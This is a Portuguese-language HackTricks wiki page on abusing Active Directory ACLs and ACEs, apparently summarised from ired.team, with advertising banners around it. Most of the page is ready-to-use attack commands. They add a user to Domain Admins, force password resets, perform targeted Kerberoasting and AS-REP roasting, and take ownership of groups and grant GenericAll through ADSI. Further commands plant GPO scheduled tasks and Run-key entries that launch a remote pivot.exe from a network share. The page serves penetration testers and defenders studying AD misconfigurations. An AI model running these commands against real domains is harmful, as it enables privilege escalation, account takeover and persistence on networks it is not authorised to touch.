# Abusando dos ACLs/ACEs do Active Directory

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Esta página é principalmente um resumo das técnicas de [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) e [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Para mais detalhes, verifique os artigos originais.**

## **Direitos GenericAll no Usuário**
Este privilégio concede a um atacante controle total sobre a conta de usuário de destino. Uma vez que os direitos `GenericAll` são confirmados usando o comando `Get-ObjectAcl`, um atacante pode:

- **Alterar a Senha do Alvo**: Usando `net user <username> <password> /domain`, o atacante pode redefinir a senha do usuário.
- **Kerberoasting Direcionado**: Atribuir um SPN à conta do usuário para torná-la kerberoastable, em seguida, usar o Rubeus e o targetedKerberoast.py para extrair e tentar quebrar os hashes do ticket-granting ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting direcionado**: Desative a pré-autenticação para o usuário, tornando a conta vulnerável ao ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Direitos GenericAll no Grupo**
Este privilégio permite a um atacante manipular associações de grupos se tiver direitos `GenericAll` em um grupo como `Administradores de Domínio`. Após identificar o nome distinto do grupo com `Get-NetGroup`, o atacante pode:

- **Adicionar-se ao Grupo de Administradores de Domínio**: Isso pode ser feito por meio de comandos diretos ou usando módulos como Active Directory ou PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**
Ter esses privilégios em um objeto de computador ou em uma conta de usuário permite:

- **Delegação Restrita Baseada em Recurso do Kerberos**: Permite assumir o controle de um objeto de computador.
- **Credenciais de Sombra**: Use essa técnica para se passar por um computador ou conta de usuário explorando os privilégios para criar credenciais de sombra.

## **WriteProperty on Group**
Se um usuário tiver direitos de `WriteProperty` em todos os objetos de um grupo específico (por exemplo, `Administradores de Domínio`), eles podem:

- **Adicionar-se ao Grupo de Administradores de Domínio**: Alcançável através da combinação dos comandos `net user` e `Add-NetGroupUser`, este método permite escalonamento de privilégios dentro do domínio.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Autoassociação (Autoassociação de Membros) em Grupo**
Esse privilégio permite que os atacantes se adicionem a grupos específicos, como `Administradores de Domínio`, por meio de comandos que manipulam diretamente a associação de grupos. Usar a sequência de comandos a seguir permite a autoadição:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Autoassociação)**
Um privilégio semelhante, isso permite que os atacantes se adicionem diretamente a grupos modificando as propriedades do grupo se tiverem o direito `WriteProperty` nesses grupos. A confirmação e execução desse privilégio são realizadas com:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Manter o `ExtendedRight` em um usuário para `User-Force-Change-Password` permite redefinir senhas sem saber a senha atual. A verificação desse direito e sua exploração podem ser feitas por meio do PowerShell ou de ferramentas de linha de comando alternativas, oferecendo vários métodos para redefinir a senha de um usuário, incluindo sessões interativas e comandos de uma linha para ambientes não interativos. Os comandos variam de invocações simples do PowerShell ao uso do `rpcclient` no Linux, demonstrando a versatilidade dos vetores de ataque.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner em Grupo**
Se um atacante descobrir que possui direitos de `WriteOwner` sobre um grupo, ele pode alterar a propriedade do grupo para si mesmo. Isso é especialmente impactante quando o grupo em questão é `Domain Admins`, pois a alteração de propriedade permite um controle mais amplo sobre os atributos e membros do grupo. O processo envolve identificar o objeto correto por meio de `Get-ObjectAcl` e, em seguida, usar `Set-DomainObjectOwner` para modificar o proprietário, seja por SID ou nome.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite no Usuário**
Esta permissão permite a um atacante modificar as propriedades do usuário. Especificamente, com acesso `GenericWrite`, o atacante pode alterar o caminho do script de logon de um usuário para executar um script malicioso no logon do usuário. Isso é alcançado usando o comando `Set-ADObject` para atualizar a propriedade `scriptpath` do usuário alvo para apontar para o script do atacante.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite em Grupo**
Com esse privilégio, os atacantes podem manipular a associação de grupos, como adicionar a si mesmos ou outros usuários a grupos específicos. Esse processo envolve a criação de um objeto de credencial, usá-lo para adicionar ou remover usuários de um grupo e verificar as alterações de associação com comandos do PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Possuir um objeto AD e ter privilégios de `WriteDACL` sobre ele permite a um atacante conceder a si mesmo privilégios `GenericAll` sobre o objeto. Isso é feito por meio da manipulação do ADSI, permitindo o controle total sobre o objeto e a capacidade de modificar suas associações de grupo. Apesar disso, existem limitações ao tentar explorar esses privilégios usando os cmdlets `Set-Acl` / `Get-Acl` do módulo Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicação no Domínio (DCSync)**
O ataque DCSync aproveita permissões específicas de replicação no domínio para imitar um Controlador de Domínio e sincronizar dados, incluindo credenciais de usuário. Essa técnica poderosa requer permissões como `DS-Replication-Get-Changes`, permitindo que os atacantes extraiam informações sensíveis do ambiente AD sem acesso direto a um Controlador de Domínio.
[**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)







## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegação de GPO

O acesso delegado para gerenciar Objetos de Política de Grupo (GPOs) pode apresentar riscos significativos de segurança. Por exemplo, se um usuário como `offense\spotless` tiver direitos de gerenciamento de GPO delegados, eles podem ter privilégios como **WriteProperty**, **WriteDacl** e **WriteOwner**. Essas permissões podem ser abusadas para fins maliciosos, conforme identificado usando o PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Enumerar Permissões de GPO

Para identificar GPOs mal configurados, os cmdlets do PowerSploit podem ser encadeados. Isso permite a descoberta de GPOs que um usuário específico tem permissão para gerenciar:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Computadores com uma Política Específica Aplicada**: É possível determinar quais computadores uma GPO específica se aplica, ajudando a entender o alcance do impacto potencial.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Políticas Aplicadas a um Computador Específico**: Para ver quais políticas são aplicadas a um computador específico, comandos como `Get-DomainGPO` podem ser utilizados.

**OUs com uma Política Específica Aplicada**: Identificar unidades organizacionais (OUs) afetadas por uma política específica pode ser feito usando `Get-DomainOU`.

### Abusar de GPO - New-GPOImmediateTask

GPOs mal configurados podem ser explorados para executar código, por exemplo, criando uma tarefa agendada imediata. Isso pode ser feito para adicionar um usuário ao grupo de administradores locais em máquinas afetadas, elevando significativamente os privilégios:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Módulo GroupPolicy - Abuso de GPO

O módulo GroupPolicy, se instalado, permite a criação e vinculação de novas GPOs, e a definição de preferências, como valores de registro, para executar backdoors em computadores afetados. Este método requer que a GPO seja atualizada e um usuário faça login no computador para a execução:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso de GPO

SharpGPOAbuse oferece um método para abusar de GPOs existentes adicionando tarefas ou modificando configurações sem a necessidade de criar novas GPOs. Esta ferramenta requer a modificação de GPOs existentes ou o uso de ferramentas RSAT para criar novas antes de aplicar as alterações:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar a Atualização de Política

As atualizações de GPO geralmente ocorrem a cada 90 minutos. Para acelerar esse processo, especialmente após a implementação de uma alteração, o comando `gpupdate /force` pode ser usado no computador alvo para forçar uma atualização imediata da política. Esse comando garante que quaisquer modificações nas GPOs sejam aplicadas sem esperar pelo próximo ciclo de atualização automática.

### Por Dentro

Ao inspecionar as Tarefas Agendadas de uma determinada GPO, como a `Política Mal Configurada`, a adição de tarefas como `evilTask` pode ser confirmada. Essas tarefas são criadas por meio de scripts ou ferramentas de linha de comando com o objetivo de modificar o comportamento do sistema ou elevar privilégios.

A estrutura da tarefa, conforme mostrado no arquivo de configuração XML gerado por `New-GPOImmediateTask`, detalha as especificidades da tarefa agendada - incluindo o comando a ser executado e seus acionadores. Esse arquivo representa como as tarefas agendadas são definidas e gerenciadas dentro das GPOs, fornecendo um método para executar comandos ou scripts arbitrários como parte da aplicação da política.

### Usuários e Grupos

As GPOs também permitem a manipulação de membros de usuários e grupos em sistemas alvo. Ao editar os arquivos de política de Usuários e Grupos diretamente, os atacantes podem adicionar usuários a grupos privilegiados, como o grupo local `administradores`. Isso é possível por meio da delegação de permissões de gerenciamento de GPO, que permite a modificação dos arquivos de política para incluir novos usuários ou alterar pertencimentos a grupos.

O arquivo de configuração XML para Usuários e Grupos detalha como essas alterações são implementadas. Ao adicionar entradas a este arquivo, usuários específicos podem receber privilégios elevados em sistemas afetados. Este método oferece uma abordagem direta para escalonamento de privilégios por meio da manipulação de GPOs.

Além disso, outros métodos para executar código ou manter persistência, como alavancar scripts de logon/logoff, modificar chaves de registro para autoruns, instalar software via arquivos .msi ou editar configurações de serviço, também podem ser considerados. Essas técnicas fornecem várias maneiras de manter o acesso e controlar sistemas alvo por meio do abuso de GPOs.



## Referências

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
